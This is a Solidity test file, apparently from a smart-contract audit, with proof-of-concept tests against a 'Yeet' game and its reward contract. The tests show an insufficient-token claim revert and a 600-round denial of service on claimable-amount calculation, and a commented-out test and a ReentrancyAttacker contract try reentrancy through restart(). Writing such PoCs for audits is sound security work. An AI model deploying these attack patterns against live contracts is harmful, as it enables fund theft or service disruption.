
import "./Yeet.Test.sol";

contract PoCTest is Test {
    Yeet public yeet;
    MockNFTContract public nft;
    Reward public reward;
    YeetGameSettings public gameSettings;
    MockERC20 public token;
    
    function setUp() public virtual {
        token = new MockERC20("TEST", "TEST", 18);
        RewardSettings settings = new RewardSettings();
        reward = new Reward(token, settings);
        IZapper zapper = IZapper(address(0x0000a));
        StakeV2 staking = new StakeV2(token, zapper, address(this), address(this), IWETH(address(0x0000b)));
        YeetGameSettings gameSettings = new YeetGameSettings();
        nft = new MockNFTContract();
        MockEntropy entropy = new MockEntropy();

        yeet = new Yeet(
            address(token),
            reward,
            staking,
            gameSettings,
            address(0x0e),
            address(0x0c),
            address(0x0),
            address(entropy),
            address(0x0001)
        );
        yeet.setYeetardsNFTsAddress(address(nft));
        reward.setYeetContract(address(yeet));
    }


    // // @poc-fail
    // function testRestartRentrancy() public {
    //     ReentrancyAttacker attacker = new ReentrancyAttacker{value: 3 ether}(yeet);

    //     yeet.yeet{value: 1 ether}();

    //     skip(2 hours);
    //     bytes32 randomNumber = 0x3b67d060cb9b8abcf5d29e15600b152af66a881e8867446e798f5752845be90d;

    //     uint128 fee = yeet.yeetback().getEntropyFee();

    //     console2.log("address", address(this));
    //     console2.log("yeet address", address(yeet));
    //     vm.expectEmit(true, true, true, false);
    //     emit Yeet.RoundStarted(2, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    //     yeet.restart{value: fee}(randomNumber);
    //     // attacker.hackRestart();

    //     vm.expectEmit();
    //     emit Yeet.Claim(address(this), block.timestamp, 0.7 ether);
    //     yeet.claim();
    // }

    // @poc-m2-done
    function test_ClaimNotEnoughToken() public {
        bytes32 randomNumber = 0x3b67d060cb9b8abcf5d29e15600b152af66a881e8867446e798f5752845be90d;
        uint128 fee = yeet.yeetback().getEntropyFee();

        yeet.yeet{value: 1 ether}();
        skip(2 hours + 1 days);
        yeet.restart{value: fee}(randomNumber);
        yeet.yeet{value: 1 ether}();
        
        vm.expectRevert("Not enough tokens in contract");
        reward.claim();
    }

    // @poc-m3
    function test_GetClaimableAmountDoS() public {
        address claimer = makeAddr("claimer");
        vm.deal(claimer, 1000_000 ether);    
        vm.startPrank(claimer);

        uint256 ROUND_LIMIT  = 600;
        bytes32 randomNumber = 0x3b67d060cb9b8abcf5d29e15600b152af66a881e8867446e798f5752845be90d;

        for(uint256 i = 0; i < ROUND_LIMIT; i++) {
            uint128 fee = yeet.yeetback().getEntropyFee();
            yeet.yeet{value: 1 ether}();
            skip(2 hours + 1 days);
            yeet.restart{value: fee}(bytes32(uint256(randomNumber) + i));
        }

        token.mint(address(reward), reward.getClaimableAmount(claimer));
        
        reward.claim();
        vm.stopPrank();
    }

    receive() external payable {} // for test
}




contract ReentrancyAttacker {
    Yeet private yeet;

    bytes32 randomNumber = 0x3b67d060cb9b8abcf5d29e15600b152af66a881e8867446e798f5752845be90d;
    uint8 nonce = 0;

    constructor(Yeet _yeet) payable{
        yeet = _yeet;
    }

    function hackRestart() public {
        yeet.restart{value: 0.2 ether}(randomNumber);
    } 

    receive() external payable {
        // nonce++;
        // if(nonce <= 2) {
        //     yeet.restart{value: 0.1 ether}(randomNumber);
        // }
        yeet.restart{value: 0.2 ether}(randomNumber);
    }

}